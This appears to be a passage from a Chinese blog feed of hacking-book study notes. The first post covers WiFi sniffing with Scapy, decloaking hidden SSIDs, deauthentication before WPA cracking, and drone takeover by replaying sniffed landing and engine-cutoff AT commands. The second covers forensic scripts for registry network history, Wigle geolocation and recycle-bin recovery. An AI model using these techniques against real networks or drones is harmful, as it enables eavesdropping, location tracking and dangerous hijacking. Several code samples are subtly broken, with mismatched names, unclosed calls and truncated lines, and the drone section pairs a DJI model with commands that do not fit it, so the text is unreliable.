        <content type="html"><![CDATA[<ul><li>1.嗅探无线网络的私人信息</li><li>2.监听请求网络和识别隐藏的无线网络</li><li>3.控制无线无人机</li><li>4.确认Firesheep的使用</li><li>5.潜入蓝牙设备</li><li>6.利用蓝牙漏洞进行渗透</li></ul><h2 id="一、嗅探无线网络的私人信息"><a href="#一、嗅探无线网络的私人信息" class="headerlink" title="一、嗅探无线网络的私人信息"></a>一、嗅探无线网络的私人信息</h2><h3 id="1-设置无线攻击环境"><a href="#1-设置无线攻击环境" class="headerlink" title="1.设置无线攻击环境"></a>1.设置无线攻击环境</h3><ul><li>编写代码嗅探无线网络流量并发送802.11数据帧</li><li>使用增益Hi-Gain USB无线网络适配器和网络放大器来测试代码</li><li>BackTrack5*中的默认网卡驱动允许用户进入混杂模式并发送原始数据帧</li><li>可能需要一个外部天线连接，附加大功率天线</li><li>*基于Debian的渗透测试和信息安全审计系统，含上百种预安装工具软件，可在Linux、Andriod安装。最新BackTrack5 r3</li></ul><h3 id="2-用Scapy测试捕获无线网络"><a href="#2-用Scapy测试捕获无线网络" class="headerlink" title="2.用Scapy测试捕获无线网络"></a>2.用Scapy测试捕获无线网络</h3><ul><li><p>用aircrack-ng工具套件的iwconfig命令列出无线网络适配器</p></li><li><p>执行airmon-ng start wlan0开启混杂模式，将创建一个新的mon0适配器</p></li><li><p>NB无线网卡支持monitor模式，需要合适的驱动支持混杂模式</p></li><li><p>和混杂模式不同，监听模式无需和AP或Ad-hoc网络建立连接</p></li><li><p>还可以用以下Linux命令改无线网卡模式为监听</p><ul><li>#ifconfig wlan0 down //无线网卡关闭状态下改变工作模式</li><li>#iwconfig wlan0 mode monitor</li><li>#iwconfig //查看mode变成了Monitor</li><li>#ifconfig wlan0 up</li></ul></li><li><p>而后使用airodump-ng或aireplay-ng攻击破解wifi</p></li><li><p>测试网卡设为混杂模式后能否捕获无线网流量</p><ul><li>conf.iface设为新创建的监控接口mon0</li><li>监听到每个数据包含802.11标识，802.11响应，TCP或DNS数据包，则输出，证明网卡模式设置成功</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pktPrint</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> pkt<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Dot11Beacon<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#信标帧，定时发送，定位和同步</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Detected 802.11 Beacon Frame'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> pkt<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Dot11ProbeReq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#探测请求帧，扫描附近的802.11网络</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Detected 802.11 Probe Request Frame'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> pkt<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Detected a TCP Packet'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> pkt<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>DNS<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Detected a DNS Packet'</span><span class="token punctuation">)</span>conf<span class="token punctuation">.</span>iface<span class="token operator">=</span><span class="token string">'mon0'</span>sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>pktPrint<span class="token punctuation">)</span></code></pre><h3 id="3-WiFi认证过程"><a href="#3-WiFi认证过程" class="headerlink" title="3.WiFi认证过程"></a>3.WiFi认证过程</h3><ul><li><p>AP定时发送Beacon广播管理帧</p></li><li><p>客户端向承载指定SSID的AP发送Probe Request（探测请求）帧，向AP请求连接</p></li><li><p>AP接入点对客户端的SSID连接请求进行应答</p></li><li><p>客户端对目标AP请求进行身份认证（Authentication）</p></li><li><p>AP对客户端的身份认证（Authentication）请求作出回应</p></li><li><p>客户端向AP发送连接（Association）请求，请求接入WLAN</p></li><li><p>AP对连接（Association）请求进行回应（包括SSID、性能、加密设置等）。至此，WiFi的连接身份认证交互全部结束，可以正常进行无线数据传输</p></li><li><p>客户端向AP请求断开连接（Disassociation）<br><img src="https://www.hualigs.cn/image/605ec1f660e73.jpg" alt=""></p></li><li><p>（Supplicant 请求者）：任何企图接入APs服务集的设备</p></li><li><p>PSK（Pre-Shared Key，预共享密钥）：PSK是预共享密钥，是用于验证L2TP/IPSec连接的Unicode字符串</p></li><li><p>PMK（Pairwise Master Key，成对主密钥）：认证者用来生成组临时密钥（GTK）的密钥，通常是认证者生成的一组随机数</p></li><li><p>GTK（Group Transient Key，组临时密钥）：由组主密钥（GMK）通过哈希运算生成，是用来保护广播和组播数据的密钥</p></li><li><p>MIC（message integrity code，消息完整性校验码）：针对一组需要保护的数据计算出的散列值，用来防止数据遭篡改</p></li><li><p>Nonce：一个随机生成的值，只使用一次</p></li><li><p>PTK（Pairwise Transient Key，成对临时密钥）：最终用于加密单播数据流的加密密钥</p></li><li><p>GTK（Group Temporal Key，组临时密钥）：最终用于加密广播和组播数据流的加密密钥</p></li></ul><h3 id="4-破解WIFI流程"><a href="#4-破解WIFI流程" class="headerlink" title="4.破解WIFI流程"></a>4.破解WIFI流程</h3><p><img src="https://www.hualigs.cn/image/605ec1f64b5de.jpg" alt=""></p><ul><li>点击“断开连接”的时候，网卡会向AP发送一个断开连接的管理数据帧，可借此发起一些针对协议的攻击（Deanthentication攻击，Disassociation攻击），迫使客户端重新连接并且产生ARP流量，捕获重新进行WPA连接的四次握手，然后可对密码进行离线字典或彩虹表破解攻击</li></ul><h3 id="5-IEEE-802-11协议中的加密算法"><a href="#5-IEEE-802-11协议中的加密算法" class="headerlink" title="5.IEEE 802.11协议中的加密算法"></a>5.IEEE 802.11协议中的加密算法</h3><ul><li>WEP，Wired Equivalent Privacy</li><li>CCMP(CTR with CBC-MAC Protocol)：基于AES</li><li>WPA(Wi-Fi Protected Access)</li><li>TKIP(Temporal Key Integrity Protocol)</li><li>WPA2(Wi-Fi Protected Access 2) </li></ul><h3 id="6-sniff标准格式"><a href="#6-sniff标准格式" class="headerlink" title="6.sniff标准格式"></a>6.sniff标准格式</h3><p>sniff(filter=”tcp port 80 and src host 192.168.88.3”,prn=pack_callback,iface=”etho”,count=20) </p><ul><li>#filter 对scapy嗅探的数据包指定BPF（wireshark类型）的过滤器，留空嗅探所有数据包</li><li>#iface 设置所需要的嗅探的网卡，留空嗅探所有网卡</li><li>#prn 指定嗅探到符合过滤器条件的数据包时调用的回调函数，这个回调函数以接收到的数据包对象为唯一的参数</li><li>#count 指定嗅探的数据包个数，留空则默认为嗅探无限个 </li></ul><h3 id="7-安装Python的蓝牙包"><a href="#7-安装Python的蓝牙包" class="headerlink" title="7.安装Python的蓝牙包"></a>7.安装Python的蓝牙包</h3><ul><li>为编写Python蓝牙脚本，需要Linux Bluez的API和obexftp API，可用apt-get install命令安装</li><li>运行hciconfig命令测试操作系统是否识别该蓝牙设备</li></ul><h2 id="二、监听请求网络和识别隐藏的无线网络"><a href="#二、监听请求网络和识别隐藏的无线网络" class="headerlink" title="二、监听请求网络和识别隐藏的无线网络"></a>二、监听请求网络和识别隐藏的无线网络</h2><h3 id="1-你的笔记本去过哪儿？"><a href="#1-你的笔记本去过哪儿？" class="headerlink" title="1.你的笔记本去过哪儿？"></a>1.你的笔记本去过哪儿？</h3><ul><li>为了提供一个无缝的连接，电脑和手机经常保持一个首选的网络列表，其中包括以前成功连接过的无线网络名称。当电脑开机或者网络断开后，就会不断发送802.11探测请求，搜索列表中的每一个网络名称</li><li>Python函数sniffProbe()作为scapy.sniff()的回调函数，检测数据包是否haslayer(Dot11ProbeReq)，是，则输出网络名</li></ul><p>可运行脚本查看附近电脑或手机的探测请求，进而看到客户机的首选网络列表</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span>interface<span class="token operator">=</span><span class="token string">'mon0'</span>probeReqs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">sniffProbe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Dot11ProbeReq<span class="token punctuation">)</span><span class="token punctuation">:</span>        netName<span class="token operator">=</span>p<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>Dot11ProbeReq<span class="token punctuation">)</span><span class="token punctuation">.</span>info        <span class="token keyword">if</span> netName <span class="token operator">not</span> <span class="token keyword">in</span> ProbeReqs<span class="token punctuation">:</span>            probeReqs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>netName<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Detected New Probe Request: '</span><span class="token operator">+</span>netName<span class="token punctuation">)</span>sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span>interface<span class="token punctuation">,</span>prn<span class="token operator">=</span>sniffProbe<span class="token punctuation">)</span></code></pre><h3 id="2-发现隐藏的802-11网络标识"><a href="#2-发现隐藏的802-11网络标识" class="headerlink" title="2.发现隐藏的802.11网络标识"></a>2.发现隐藏的802.11网络标识</h3><ul><li>大多数无线网络公开名称（SSID），有些网络使用隐藏的SSID防止暴露网络名称。802.11信标帧中的info字段通常包含网络名称，在隐藏的网络中，接入点的这个字段为空白。可搜索空白字段的802.11信标帧，得到这些接入点的MAC地址</li><li>尽管隐藏SSID的无线AP在802.11信标帧中的info字段为空，但在探测响应中仍将发送SSID。为此，黑客必须等待一个匹配该AP的802.11标识帧中MAC地址的探测响应帧<ul><li>检测到一个info为空的802.11信标帧时，将其MAC加入hiddenNets数组</li><li>检测到802.11探测响应帧时，提取SSID和MAC，如果此MAC在hiddenNets数组而不在unhiddenNets数组中，则意味着新发现了一个隐藏SSID的网络，打印输出并将其MAC加入unhiddenNets数组</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span>interface<span class="token operator">=</span><span class="token string">'mon0'</span>hiddenNets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>unhiddenNets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">sniffDot11</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Dot11Beacon<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> p<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>Dot11Beacon<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">:</span>            addr2<span class="token operator">=</span>p<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>Dot11<span class="token punctuation">)</span><span class="token punctuation">.</span>addr2    <span class="token comment" spellcheck="true">#MAC</span>            <span class="token keyword">if</span> addr2 <span class="token operator">not</span> <span class="token keyword">in</span> hiddenNets<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Detected Hidden SSID:'</span> <span class="token operator">+</span> <span class="token string">'with MAC:'</span> <span class="token operator">+</span>addr2<span class="token punctuation">)</span>                hiddenNets<span class="token punctuation">.</span>append<span class="token punctuation">(</span>addr2<span class="token punctuation">)</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Dot11ProbeResp<span class="token punctuation">)</span><span class="token punctuation">:</span>        addr2<span class="token operator">=</span>p<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>Dot11<span class="token punctuation">)</span><span class="token punctuation">.</span>addr2    <span class="token comment" spellcheck="true">#MAC</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>addr2 <span class="token keyword">in</span> hiddenNets<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>addr2 <span class="token operator">not</span> <span class="token keyword">in</span> unhiddenNets<span class="token punctuation">)</span><span class="token punctuation">:</span>            netName<span class="token operator">=</span>p<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>Dot11ProbeResp<span class="token punctuation">)</span><span class="token punctuation">.</span>info            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Decloaked Hidden SSID:'</span> <span class="token operator">+</span>netName <span class="token operator">+</span><span class="token string">'for MAC:'</span><span class="token operator">+</span>addr2            unhiddenNets<span class="token punctuation">.</span>append<span class="token punctuation">(</span>addr2<span class="token punctuation">)</span>sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span>interface<span class="token punctuation">,</span>prn<span class="token operator">=</span>sniffDot11<span class="token punctuation">)</span></code></pre><h2 id="三、控制无线无人机"><a href="#三、控制无线无人机" class="headerlink" title="三、控制无线无人机"></a>三、控制无线无人机</h2><ul><li>大疆精灵3标准版用wifi传输（点对点wifi）</li><li>更新的大疆无人机通过自研的lightbridge/2进行控制和数据传输<br><img src="https://www.hualigs.cn/image/605ec1f661339.jpg" alt=""></li></ul><h3 id="1-拦截流量，检测协议"><a href="#1-拦截流量，检测协议" class="headerlink" title="1.拦截流量，检测协议"></a>1.拦截流量，检测协议</h3><ul><li>无人机和iPhone之间通过WIFI建立了一个ad-hoc点对点无线连接，只有配对成功的iPhone才能对无人机发送指令</li><li>为了接管无人机，需要学习指令协议，再重发这些指令</li><li>将NB无线网卡设置为混杂模式监听流量，发现无人机有大量数据发向iPhone的UDP 5555端口，显然这是无人机视频下载连接，而导航命令似乎直接从iPhone的UDP 5556端口发出<br><img src="https://www.hualigs.cn/image/605ec1f64977d.jpg" alt=""></li></ul><p>编程输出原始的iPhone UDP 5556的导航数据</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span>NAVPORT<span class="token operator">=</span><span class="token number">5556</span><span class="token keyword">def</span> <span class="token function">printPkt</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> pkt<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>UDP<span class="token punctuation">)</span> <span class="token operator">and</span> pkt<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>UDP<span class="token punctuation">)</span><span class="token punctuation">.</span>dport<span class="token operator">==</span>NAVPORT<span class="token punctuation">:</span>        raw<span class="token operator">=</span>pkt<span class="token punctuation">.</span>sprintf<span class="token punctuation">(</span><span class="token string">'%Raw.load%'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> rawconf<span class="token punctuation">.</span>iface<span class="token operator">=</span><span class="token string">'mon0'</span>sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>printPkt<span class="token punctuation">)</span></code></pre><ul><li>长时间的流量记录发现几条可用于攻击的简单指令<ul><li>AT*REF=$SEQ,290717696\r    发送降落命令</li><li>AT*REF=$SEQ,290717952\r    发送紧急降落命令，立即切断引擎</li><li>AT*REF=$SEQ,290718208\r    发送起飞指令</li><li>AT*PCMD=SEQ,Left_Right_Tilt，Front_Back_Tilt，Vertical_Speed，Angular_Speed    控制无人机飞行</li></ul></li><li>要制作一个包含无人机指令的新数据包，需要从当前的数据帧中复制些必要的信息。因为数据包包含Radio Tap，802.11，SNAP，LLC，IP和UDP层，需要从各个层中复制相关字段。Scapy支持上述各层协议</li><li>在各层里有些字段不必复制，比如IP地址字段，数据包长度、校验值可以由Scapy自动计算</li><li>dup.py是各协议层帧字段复制函数集合</li><li>uavSniff.py启动interactThread线程截获控制命令帧，复制必要字段，伪造、发送控制命令实施紧急降落</li></ul><p>3/27/2021 1:34:03 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>调查取证</title>
      <link href="2021/03/26/diao-cha-qu-zheng/"/>
      <url>2021/03/26/diao-cha-qu-zheng/</url>
      
        <content type="html"><![CDATA[<ul><li>1.通过Windows注册表定位</li><li>2.回收站调查</li><li>3.审查PDF和DOC文件的元数据</li><li>4.从Exif元数据中提取GPS坐标</li><li>5.探究Skype结构</li><li>6.从火狐的数据库中枚举浏览器结构</li><li>7.审查移动设备结构</li></ul><h2 id="一、通过Windows注册表定位"><a href="#一、通过Windows注册表定位" class="headerlink" title="一、通过Windows注册表定位"></a>一、通过Windows注册表定位</h2><h3 id="1-在注册表中分析无线接入点"><a href="#1-在注册表中分析无线接入点" class="headerlink" title="1.在注册表中分析无线接入点"></a>1.在注册表中分析无线接入点</h3><ul><li>Windows注册表是个存储操作系统配置信息的层次数据库。随着无线网的出现，Windows注册表存储了与无线连接相关的信息。了解注册表键值的位置和意义可以提供详细的笔记本到过的地理位置</li><li>注册表将网络信息存储在 HEKY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\子键值下</li><li>Windows命令提示符下（以管理员权限）可以列出每一个网络显示描述GUID，网络描述，网络名称和网关MAC地址<br><img src="https://www.hualigs.cn/image/605d8f07e5212.jpg" alt=""></li></ul><h3 id="2-使用WINREG读取Windows注册表"><a href="#2-使用WINREG读取Windows注册表" class="headerlink" title="2.使用WINREG读取Windows注册表"></a>2.使用WINREG读取Windows注册表</h3><ul><li>注册表存储的网关MAC地址为REG_BINARY类型<ul><li>在前面的例子中，最后一行“DefaultGatewayMac REG_BINARY 00115024687F0000”表示的MAC地址为00:11:50:24:68:7F</li><li>函数val2addr(val)将REG_BINARY的值转换为实际的MAC地址</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">val2addr</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    addr<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> val<span class="token punctuation">:</span>        adddr<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token operator">%</span>ord<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>    addr<span class="token operator">=</span>addr<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> addr</code></pre><ul><li>从Win注册表键值中获取各个列出来的网络名称和MAC地址<ul><li>需要winreg模块，Windows版Python默认安装</li><li>连接到注册表后，用OpenKey()函数打开键，并循环获取键下存储的所有网络描述 （Network Profile）</li><li>每个描述包含子键：ProfileGuid，Description，Source，DnsSuffix，FirstNetwork，DefaultGatewayMac。网络名称和网关MAC地址在注册表键列表中的第四个和第五个</li><li>以管理员权限在目标笔记本上运行脚本（1-discoverNetworks-printNets.py），可列出连接过的无线网络及其MAC地址</li></ul></li></ul><h3 id="3-用MECHANIZE将MAC地址提交到WIGLE"><a href="#3-用MECHANIZE将MAC地址提交到WIGLE" class="headerlink" title="3.用MECHANIZE将MAC地址提交到WIGLE"></a>3.用MECHANIZE将MAC地址提交到WIGLE</h3><ul><li><p>得到无线AP的MAC地址后，还可获取无线AP的物理位置（经纬坐标）</p><ul><li>有开源的和专有的数据库，包含了大量与无线接入点物理位置相关的信息。有些手机就是使用这样的地理位置的数据库而没有人用GPS</li><li>2012之后，由于隐私问题，Google、微软相继封闭/关闭了类似的WIFI物理位置数据库</li><li>开源数据库项目WIGLE.net继续允许用户搜索AP物理位置，注册账号后，用户即可通过一段短小的Python脚本和wigle.net进行交互</li></ul></li><li><p>用户必须三次Wigle页面访问</p><ul><li>用户必须打开Wigle主面<a href="https://wigle.net/" target="_blank" rel="noopener">https://wigle.net/</a></li><li>然后登陆Wigle</li><li>最后，查询特定的无线SSID的MAC地址</li><li>截获分析地址查询请求过程的HTTP包，发现在请求AP的GPS的HTTP POST请求中MAC地址被放在netid参数中提交<br><img src="https://www.hualigs.cn/image/605d8f076680b.jpg" alt=""></li><li>页面响应的数据中包含返回的GPS坐标。字串maplat=47.25264359 &amp; maplon=-87.25624084 包含了AP的经纬度</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>tr <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"search"</span><span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/gps/gps/Map/onlinemap2/?maplat=47.25264359&amp;amp;maplon=-87.25624084&amp;amp;mapzoom=17&amp;amp;ssid=McDonald's FREE Wifi&amp;amp;netid=0A:2C:EF:25:1B"</span><span class="token operator">></span>Get Map<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token number">0A</span><span class="token punctuation">:</span><span class="token number">2C</span><span class="token punctuation">:</span>EF<span class="token punctuation">:</span><span class="token number">3D</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">1B</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span>McDonald's FREE Wifi<span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><ul><li>mechanize模块（<a href="http://www.search.sourceforge.net/mechanize/）可进行WEB状态编程，类似于urllib2模块的功能（存储和重用验证cookie）" target="_blank" rel="noopener">www.search.sourceforge.net/mechanize/）可进行WEB状态编程，类似于urllib2模块的功能（存储和重用验证cookie）</a></li><li>wiglePrint函数返回Wigle数据库中AP的经纬度</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> mechanize<span class="token punctuation">,</span>urllib<span class="token punctuation">,</span>re<span class="token punctuation">,</span>urlparse<span class="token keyword">def</span> <span class="token function">wiglePrint</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>netid<span class="token punctuation">)</span><span class="token punctuation">:</span>    browser<span class="token operator">=</span>mechanize<span class="token punctuation">.</span>Browser<span class="token punctuation">(</span><span class="token punctuation">)</span>    browser<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'https://wigle.net'</span><span class="token punctuation">)</span>    reqData<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'credential_0'</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span><span class="token string">'credential_1'</span><span class="token punctuation">:</span>password<span class="token punctuation">}</span><span class="token punctuation">)</span>    browser<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'https://wigle.net/gps/gps/main/login'</span><span class="token punctuation">,</span>reqData<span class="token punctuation">)</span>    params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    params<span class="token punctuation">[</span><span class="token string">'netid'</span><span class="token punctuation">]</span><span class="token operator">=</span>netid    reqParams<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>params<span class="token punctuation">)</span>    respURL<span class="token operator">=</span><span class="token string">'http://wigle.net/gps/gps/main/confirmquery/'</span>    resp<span class="token operator">=</span>browser<span class="token punctuation">.</span>open<span class="token punctuation">(</span>respURL<span class="token punctuation">,</span>reqParams<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    mapLat<span class="token operator">=</span><span class="token string">'N/A'</span>    mapLon<span class="token operator">=</span><span class="token string">'N/A'</span>    rLat<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'maplat=.*\&amp;amp;'</span><span class="token punctuation">,</span>resp<span class="token punctuation">)</span>    <span class="token keyword">if</span> rLat<span class="token punctuation">:</span>        mapLat<span class="token operator">=</span>rLat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&amp;amp:'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    rLon<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'maplon=.*\&amp;amp;'</span><span class="token punctuation">,</span>resp<span class="token punctuation">)</span>    <span class="token keyword">if</span> rLon<span class="token punctuation">:</span>        mapLon<span class="token operator">=</span>rLon<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Lat:'</span><span class="token operator">+</span>mapLat<span class="token operator">+</span><span class="token string">',Lon:'</span><span class="token operator">+</span>mapLon<span class="token punctuation">)</span></code></pre><p>综合几段代码，得到1-discoverNetworks.py，可实现检查注册表中以前连接过的AP并查询物理位置</p><h2 id="二、回收站调查"><a href="#二、回收站调查" class="headerlink" title="二、回收站调查"></a>二、回收站调查</h2><h3 id="1-恢复回收站中的项目"><a href="#1-恢复回收站中的项目" class="headerlink" title="1.恢复回收站中的项目"></a>1.恢复回收站中的项目</h3><ul><li>用户通过Windows Explorer删除文件时，系统会将这个文件移动到回收站特殊文件夹中并标记这文件已删除<ul><li>Windows版本不同，回收站位置在以下可能的目录’C:\Recycler'，’C:\Recycled'，’C:$Recycle.Bin' C:\Users\Administrator&gt;dir $Recycle.Bin /a</li><li>发现回收站目录后，其中两个子目录都包含字符串S-1-5-21-1275210071-1715567821-725345543- 并以1005或500结尾。这个字符串表示用户的SID，与机器上的用户账户一一相对应</li></ul></li></ul><h3 id="2-SID-gt-用户名"><a href="#2-SID-gt-用户名" class="headerlink" title="2.SID=>用户名"></a>2.SID=&gt;用户名</h3><ul><li>将Windows注册表中的SID转为用户名<ul><li>查看注册表键值 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ProfileList&lt;SID&gt;\ProfileImagePath中是%SystemDrive%\Documents and Settings&lt;USERID&gt;</li><li>编写函数打开注册表检查相应的ProfileImagePath键值，从中找到用户名</li><li>由此，在恢复回收站中被删项目时，将获得更多有用的信息</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> winreg <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">sid2user</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        key<span class="token operator">=</span>OpenKey<span class="token punctuation">(</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span> "SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ProfileList\" <span class="token operator">+</span> sid<span class="token punctuation">)</span>        <span class="token punctuation">(</span>value<span class="token punctuation">,</span>type<span class="token punctuation">)</span><span class="token operator">=</span>QueryValueEx<span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token string">'ProfileImagePath'</span><span class="token punctuation">)</span>        user<span class="token operator">=</span>value<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#最后一个\之后的项('\'\转义)</span>        <span class="token keyword">return</span> user    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> sid</code></pre><p>代码综合成2-dumpRecycleBin.py，发现了两个用户：Administrator和alex，列出了回收站中每个用户的文件</p><h2 id="三、元数据"><a href="#三、元数据" class="headerlink" title="三、元数据"></a>三、元数据</h2><ul><li>元数据可存在于文档，电子表格，图像，音频和视频等文件类型中。应用程序可能会在文档中存储一些细节如文件的作者，创建和修改时间，潜在的修订和注释等信息，相机/手机可以在照片中标记拍照地的GPS信息</li><li>黑客组织Anonymous曾为名为Operation Payback的DDOS攻击发表一份声明稿，这个pdf文件的声明稿没有签名，没有来源，但其中的元数据包含作者的名字Mr.Alex Tapanaris。几天后，警方抓住了他</li><li>Wired.com还保留着那份声明（<a href="http://www.wired.com/images_blogs/threatlevel/2010/12/ANONOPS_The_Press_Release.pdf）" target="_blank" rel="noopener">www.wired.com/images_blogs/threatlevel/2010/12/ANONOPS_The_Press_Release.pdf）</a></li></ul><h3 id="1-用PyPDF解析PDF元数据"><a href="#1-用PyPDF解析PDF元数据" class="headerlink" 